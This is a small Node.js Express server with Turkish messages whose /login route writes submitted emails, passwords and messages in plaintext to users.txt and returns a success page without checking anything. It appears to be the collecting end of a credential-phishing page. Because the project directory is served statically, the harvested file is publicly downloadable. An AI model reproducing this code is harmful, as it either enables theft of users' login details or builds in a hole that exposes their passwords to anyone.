const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const port = 3000;

app.use(express.static(__dirname));
app.use(bodyParser.urlencoded({ extended: false }));

app.post('/login', (req, res) => {
  const email = req.body.email;
  const password = req.body.password;
  const message = req.body.message;

  const data = `${email}:${password}:${message}\n`;

  fs.appendFile('users.txt', data, (err) => {
    if (err) {
      console.error(err);
      return res.send('Hata oluştu.');
    }
    res.sendFile(path.join(__dirname, 'success.html'));
  });
});

app.listen(port, () => {
  console.log(`Server çalışıyor: http://localhost:${port}`);
});